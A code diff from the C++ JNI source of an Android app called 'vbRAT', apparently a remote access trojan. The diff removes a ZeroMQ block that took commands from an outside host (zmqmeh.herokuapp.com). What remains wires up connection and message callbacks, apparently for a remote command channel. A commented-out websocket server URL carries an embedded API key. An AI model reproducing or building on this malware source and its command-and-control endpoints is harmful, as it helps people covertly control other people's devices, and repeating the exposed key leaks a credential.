@@ -10,8 +10,6 @@
 #include "vbConnection.h"
 #include "vbDeviceProperties.h"
 #include "vbTTY.h"
-#include "zmq.h"
-#include "zmq_utils.h"
 
 using namespace std;
 //#define SERVER_ADDR "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi"
@@ -100,15 +98,6 @@ void vbRAT_messageReceived(const char* buf, int len)
 extern "C" JNIEXPORT jint JNICALL
 Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)
 {
-    int err=0;
-   void *context = zmq_ctx_new ();
-   void *requester = zmq_socket (context, ZMQ_PULL);
-   err = zmq_bind (requester, "tcp://zmqmeh.herokuapp.com:9998");
-    //err = zmq_setsockopt(requester, ZMQ_SUBSCRIBE, "kitty cats", strlen("kitty cats"));
-    char recv[256];
-    err = zmq_recv(requester, recv, 256, 0);
-    //std::list<std::string> netDevices[2];
-    //vbDevProp_getActiveNetworks(netDevices);
     vbConnection_onConnected(vbRAT_connected);
     vbConnection_onDisconnected(vbRAT_disconnected);
     vbConnection_onMessage(vbRAT_messageReceived);
